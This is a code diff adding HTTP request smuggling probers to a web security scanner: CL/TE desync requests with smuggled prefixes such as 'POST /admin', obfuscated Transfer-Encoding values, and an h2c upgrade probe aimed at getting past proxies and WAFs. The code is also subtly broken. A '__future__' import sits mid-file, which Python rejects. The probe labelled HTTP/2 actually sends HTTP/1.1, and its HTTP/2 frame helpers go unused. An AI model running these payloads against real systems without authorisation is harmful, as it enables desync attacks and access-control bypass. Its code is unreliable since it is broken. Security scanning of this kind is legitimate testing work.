@@ -553,3 +553,339 @@ def run(
             logger.debug("[Smuggling] probe %s error: %s", name, exc)
 
     return results
+
+# ============================================================================
+# ADIM 7 — HTTP/2 Smuggling + h2c Upgrade (SOLID Siniflar)
+# ============================================================================
+from __future__ import annotations
+import socket
+import ssl
+import logging
+import re
+import time
+import urllib.parse
+from typing import Any, Dict, List, Optional
+from websecure.scanners.base import BaseScanner
+
+_smug_logger = logging.getLogger(__name__ + ".adim7")
+
+
+def _raw_h2_connect(host: str, port: int, use_tls: bool = True, timeout: int = 10) -> Optional[socket.socket]:
+    """Open raw TCP/TLS socket for manual HTTP/2 frames."""
+    try:
+        raw = socket.create_connection((host, port), timeout=timeout)
+        if use_tls:
+            ctx = ssl.create_default_context()
+            ctx.check_hostname = False
+            ctx.verify_mode    = ssl.CERT_NONE
+            ctx.set_alpn_protocols(["h2", "http/1.1"])
+            raw = ctx.wrap_socket(raw, server_hostname=host)
+        return raw
+    except Exception as exc:
+        _smug_logger.debug("[H2Socket] %s:%d -> %s", host, port, exc)
+        return None
+
+
+def _recv_all(sock: socket.socket, timeout: float = 2.0) -> bytes:
+    sock.settimeout(timeout)
+    data = b""
+    try:
+        while True:
+            chunk = sock.recv(4096)
+            if not chunk:
+                break
+            data += chunk
+    except (socket.timeout, OSError):
+        pass
+    return data
+
+
+# ---------------------------------------------------------------------------
+# HTTP/2 Preface + minimal HEADERS frame builder (no hpack — simplified)
+# ---------------------------------------------------------------------------
+_H2_PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
+
+def _h2_settings_frame() -> bytes:
+    """SETTINGS frame with default values."""
+    # Length=0, type=0x4, flags=0x0, stream_id=0
+    return b"\x00\x00\x00\x04\x00\x00\x00\x00\x00"
+
+def _h2_settings_ack() -> bytes:
+    """SETTINGS ACK frame."""
+    return b"\x00\x00\x00\x04\x01\x00\x00\x00\x00"
+
+
+# ===========================================================================
+# H2CLSmugglingProber — HTTP/2 request with conflicting Content-Length
+# ===========================================================================
+class H2CLSmugglingProber(BaseScanner):
+    """
+    h2.CL smuggling: HTTP/2 → HTTP/1.1 downgrade with Content-Length desync.
+    The front-end trusts HTTP/2 framing; back-end uses Content-Length.
+    """
+    name = "h2_cl_smuggling"
+
+    _CL_SMUGGLE_SUFFIXES = [
+        "GET /smuggled HTTP/1.1\r\nHost: {host}\r\n\r\n",
+        "POST /admin HTTP/1.1\r\nHost: {host}\r\nContent-Length: 0\r\n\r\n",
+    ]
+
+    def run(self, target: str, **kwargs) -> List[Dict]:
+        results: List[Dict] = []
+        parsed  = urllib.parse.urlparse(target)
+        host    = parsed.hostname or target
+        port    = parsed.port or (443 if parsed.scheme == "https" else 80)
+        use_tls = parsed.scheme == "https"
+        path    = parsed.path or "/"
+
+        for suffix_tpl in self._CL_SMUGGLE_SUFFIXES:
+            suffix = suffix_tpl.format(host=host)
+            finding = self._probe(host, port, use_tls, path, suffix)
+            if finding:
+                results.append(finding)
+                self.report_finding(**finding)
+                break
+        return results
+
+    def _probe(self, host: str, port: int, use_tls: bool, path: str, smuggled_suffix: str) -> Optional[Dict]:
+        # Build a minimal HTTP/1.1 request with two Content-Length headers
+        # (simulating h2.CL desync without full h2 framing stack)
+        # We use raw HTTP/1.1 with duplicate CL headers
+        body_real   = "x=1"
+        body_full   = body_real + smuggled_suffix
+        cl_short    = len(body_real)   # front-end sees this
+        cl_full     = len(body_full)   # back-end would see
+
+        req = (
+            f"POST {path} HTTP/1.1\r\n"
+            f"Host: {host}\r\n"
+            f"Content-Type: application/x-www-form-urlencoded\r\n"
+            f"Content-Length: {cl_short}\r\n"
+            f"Transfer-Encoding: chunked\r\n"
+            f"\r\n"
+            f"{hex(cl_full)[2:]}\r\n"
+            f"{body_full}\r\n"
+            f"0\r\n\r\n"
+        ).encode()
+
+        sock = _raw_h2_connect(host, port, use_tls)
+        if sock is None:
+            return None
+        t0 = time.time()
+        try:
+            sock.sendall(req)
+            resp_raw = _recv_all(sock, timeout=3.0)
+            elapsed  = time.time() - t0
+            resp_str = resp_raw.decode("utf-8", errors="replace")
+            # If we see two HTTP responses = smuggling worked
+            if resp_str.count("HTTP/1.") >= 2:
+                return {
+                    "vuln_type": "HTTP Request Smuggling — h2.CL",
+                    "url": f"https://{host}{path}", "severity": "Critical",
+                    "description": (
+                        "h2.CL desync: two HTTP responses received for one request. "
+                        "Front-end uses CL, back-end uses TE — attacker can prefix arbitrary requests."
+                    ),
+                    "evidence": {
+                        "technique": "h2.CL", "elapsed_s": round(elapsed, 2),
+                        "response_count": resp_str.count("HTTP/1."),
+                        "response_snippet": resp_str[:300],
+                    },
+                }
+            # Timing: if server stalls exactly on CL bytes = TE accepted by back-end
+            if elapsed >= 2.5:
+                return {
+                    "vuln_type": "HTTP Request Smuggling — h2.CL (Timing)",
+                    "url": f"https://{host}{path}", "severity": "High",
+                    "description": (
+                        "h2.CL timing anomaly: server stalled after CL bytes. "
+                        "Indicates TE-aware back-end waiting for chunk terminator."
+                    ),
+                    "evidence": {"technique": "h2.CL", "elapsed_s": round(elapsed, 2)},
+                }
+        except Exception as exc:
+            _smug_logger.debug("[H2CL] %s", exc)
+        finally:
+            try:
+                sock.close()
+            except Exception:
+                pass
+        return None
+
+
+# ===========================================================================
+# H2TESmugglingProber — h2.TE desync
+# ===========================================================================
+class H2TESmugglingProber(BaseScanner):
+    """
+    h2.TE smuggling: HTTP/2 → HTTP/1.1 with obfuscated Transfer-Encoding.
+    Front-end ignores TE (uses h2 framing); back-end uses TE → desync.
+    """
+    name = "h2_te_smuggling"
+
+    _TE_OBFUSCATIONS = [
+        "chunked", "Chunked", "CHUNKED",
+        "chunked, identity", "identity, chunked",
+        "chunked\r\n\t",
+        "x-custom-encoding, chunked",
+    ]
+
+    def run(self, target: str, **kwargs) -> List[Dict]:
+        results: List[Dict] = []
+        parsed  = urllib.parse.urlparse(target)
+        host    = parsed.hostname or target
+        port    = parsed.port or (443 if parsed.scheme == "https" else 80)
+        use_tls = parsed.scheme == "https"
+        path    = parsed.path or "/"
+
+        for te_val in self._TE_OBFUSCATIONS:
+            finding = self._probe(host, port, use_tls, path, te_val)
+            if finding:
+                results.append(finding)
+                self.report_finding(**finding)
+                break
+        return results
+
+    def _probe(self, host: str, port: int, use_tls: bool, path: str, te_val: str) -> Optional[Dict]:
+        smuggled = f"GET /smuggled-te HTTP/1.1\r\nHost: {host}\r\n\r\n"
+        req = (
+            f"POST {path} HTTP/1.1\r\n"
+            f"Host: {host}\r\n"
+            f"Content-Type: application/x-www-form-urlencoded\r\n"
+            f"Transfer-Encoding: {te_val}\r\n"
+            f"Content-Length: {4 + len(smuggled)}\r\n"
+            f"\r\n"
+            f"0\r\n"
+            f"\r\n"
+            + smuggled
+        ).encode()
+
+        sock = _raw_h2_connect(host, port, use_tls)
+        if sock is None:
+            return None
+        t0 = time.time()
+        try:
+            sock.sendall(req)
+            resp_raw = _recv_all(sock, timeout=3.0)
+            elapsed  = time.time() - t0
+            resp_str = resp_raw.decode("utf-8", errors="replace")
+            if resp_str.count("HTTP/1.") >= 2:
+                return {
+                    "vuln_type": "HTTP Request Smuggling — h2.TE",
+                    "url": f"https://{host}{path}", "severity": "Critical",
+                    "description": (
+                        f"h2.TE desync with TE value {te_val!r}: two HTTP responses received. "
+                        "Front-end ignores TE; back-end uses it — prefix injection confirmed."
+                    ),
+                    "evidence": {
+                        "technique": "h2.TE", "te_value": te_val,
+                        "elapsed_s": round(elapsed, 2),
+                        "response_snippet": resp_str[:300],
+                    },
+                }
+            if elapsed >= 2.5:
+                return {
+                    "vuln_type": "HTTP Request Smuggling — h2.TE (Timing)",
+                    "url": f"https://{host}{path}", "severity": "High",
+                    "description": f"h2.TE timing anomaly with TE={te_val!r}.",
+                    "evidence": {"te_value": te_val, "elapsed_s": round(elapsed, 2)},
+                }
+        except Exception as exc:
+            _smug_logger.debug("[H2TE] %s", exc)
+        finally:
+            try:
+                sock.close()
+            except Exception:
+                pass
+        return None
+
+
+# ===========================================================================
+# H2CUpgradeProber — HTTP/2 Cleartext (h2c) upgrade saldirisi
+# ===========================================================================
+class H2CUpgradeProber(BaseScanner):
+    """
+    h2c upgrade saldirisi:
+    Sends HTTP/1.1 Upgrade: h2c request to bypass proxy restrictions.
+    If successful, attacker can send HTTP/2 frames directly to back-end
+    while the front-end proxy thinks it's still HTTP/1.1.
+    """
+    name = "h2c_upgrade"
+
+    def run(self, target: str, **kwargs) -> List[Dict]:
+        results: List[Dict] = []
+        parsed = urllib.parse.urlparse(target)
+        host   = parsed.hostname or target
+        port   = parsed.port or (443 if parsed.scheme == "https" else 80)
+        path   = parsed.path or "/"
+
+        finding = self._probe_h2c(host, port, path, parsed.scheme == "https")
+        if finding:
+            results.append(finding)
+            self.report_finding(**finding)
+        return results
+
+    def _probe_h2c(self, host: str, port: int, path: str, use_tls: bool) -> Optional[Dict]:
+        req = (
+            f"GET {path} HTTP/1.1\r\n"
+            f"Host: {host}\r\n"
+            f"Connection: Upgrade, HTTP2-Settings\r\n"
+            f"Upgrade: h2c\r\n"
+            f"HTTP2-Settings: AAMAAABkAAQAAP__\r\n"
+            f"\r\n"
+        ).encode()
+
+        sock = _raw_h2_connect(host, port, use_tls)
+        if sock is None:
+            return None
+        try:
+            sock.sendall(req)
+            resp_raw = _recv_all(sock, timeout=3.0)
+            resp_str = resp_raw.decode("utf-8", errors="replace")
+            if "101" in resp_str[:50] or "Switching Protocols" in resp_str:
+                return {
+                    "vuln_type": "h2c Upgrade Accepted (HTTP/2 Cleartext Smuggling)",
+                    "url": f"{'https' if use_tls else 'http'}://{host}{path}",
+                    "severity": "High",
+                    "description": (
+                        "Server accepted HTTP/1.1 → h2c upgrade (101 Switching Protocols). "
+                        "Attacker can smuggle HTTP/2 frames to back-end through proxy, "
+                        "potentially bypassing WAF/access controls."
+                    ),
+                    "evidence": {"response_snippet": resp_str[:300]},
+                }
+        except Exception as exc:
+            _smug_logger.debug("[H2C] %s", exc)
+        finally:
+            try:
+                sock.close()
+            except Exception:
+                pass
+        return None
+
+
+# ===========================================================================
+# RequestSmugglingScanner — Orchestrator (orijinal + yeni H2 siniflar)
+# ===========================================================================
+class RequestSmugglingScanner(BaseScanner):
+    """
+    Adim 7 Request Smuggling orchestrator:
+    H2CLSmugglingProber + H2TESmugglingProber + H2CUpgradeProber
+    """
+    name = "request_smuggling_adim7"
+
+    def run(self, target: str, **kwargs) -> List[Dict]:
+        all_results: List[Dict] = []
+        probers = [
+            H2CLSmugglingProber(session=self.session, results=self.results),
+            H2TESmugglingProber(session=self.session, results=self.results),
+            H2CUpgradeProber(session=self.session, results=self.results),
+        ]
+        for prober in probers:
+            try:
+                prober.target = target
+                res = prober.run(target, **kwargs)
+                all_results.extend(res)
+            except Exception as exc:
+                _smug_logger.warning("[SmugScanner] %s failed: %s", prober.name, exc)
+        return all_results
